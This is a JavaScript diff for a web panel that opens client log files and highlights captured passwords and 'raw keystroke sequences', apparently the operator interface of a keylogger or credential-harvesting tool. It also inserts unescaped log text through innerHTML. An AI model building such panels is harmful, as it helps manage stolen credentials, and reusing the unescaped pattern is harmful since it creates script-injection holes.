@@ -627,6 +627,7 @@ async function viewLog(clientId, filename) {
 }
 
 // 查看日志内容并滚动到包含密码的行
+// 查看日志内容并滚动到包含原始密码数据的行
 async function viewLogWithPassword(clientId, filename, password, rawPassword) {
     try {
         const response = await fetch(`/api/clients/${clientId}/logs/${filename}/raw`);
@@ -638,27 +639,33 @@ async function viewLogWithPassword(clientId, filename, password, rawPassword) {
         const content = await response.text();
         document.getElementById('logModalTitle').textContent = filename;
         
-        // 创建包含密码和原始数据高亮的HTML内容
+        // 创建高亮HTML内容：仅高亮原始数据（如果存在），否则高亮解析后的密码
         let highlightedContent = content;
         
-        // 首先高亮原始数据（如果有）
         if (rawPassword) {
-            highlightedContent = highlightedContent.replace(new RegExp(rawPassword, 'g'), `<span class="raw-password-highlight">${rawPassword}</span>`);
+            // 仅高亮原始按键序列
+            highlightedContent = highlightedContent.replace(
+                new RegExp(rawPassword, 'g'), 
+                `<span class="raw-password-highlight">${rawPassword}</span>`
+            );
+        } else {
+            // 如果没有原始数据，才高亮解析后的密码（兜底）
+            highlightedContent = highlightedContent.replace(
+                new RegExp(password, 'g'), 
+                `<span class="password-highlight">${password}</span>`
+            );
         }
         
-        // 然后高亮处理后的密码
-        highlightedContent = highlightedContent.replace(new RegExp(password, 'g'), `<span class="password-highlight">${password}</span>`);
-        
-        // 使用innerHTML而不是textContent来支持HTML
+        // 使用 innerHTML 支持高亮样式
         document.getElementById('logContent').innerHTML = highlightedContent;
         document.getElementById('logModal').classList.add('show');
         
-        // 滚动到第一个高亮的位置（优先原始数据）
+        // 滚动到第一个高亮位置（优先原始数据）
         setTimeout(() => {
             let highlight = document.querySelector('.raw-password-highlight') || document.querySelector('.password-highlight');
             if (highlight) {
                 highlight.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                // 添加闪烁效果以吸引注意
+                // 添加闪烁效果
                 highlight.classList.add('blink');
                 setTimeout(() => {
                     highlight.classList.remove('blink');
@@ -746,18 +753,17 @@ async function loadBlacklist(page = 1) {
         blacklistPage = data.page || blacklistPage;
         const table = document.getElementById('blacklistTable');
         if (rows.length === 0) {
-            table.innerHTML = `<tr><td colspan="4" class="empty-state">暂无屏蔽密码</td></tr>`;
+            table.innerHTML = `<tr><td colspan="3" class="empty-state">暂无屏蔽密码</td></tr>`;
         } else {
             let html = '';
             rows.forEach(row => {
                 html += `
                     <tr data-id="${row.id}">
-                        <td>${row.id}</td>
                         <td>${escapeHtml(row.password)}</td>
                         <td>${escapeHtml(row.created_at)}</td>
                         <td>
                             <button class="btn btn-sm btn-danger" onclick="deleteBlacklistEntry(${row.id})">
-                                <i class="fas fa-trash"></i> 删除
+                                <i class="fas fa-trash"></i> 取消屏蔽
                             </button>
                         </td>
                     </tr>
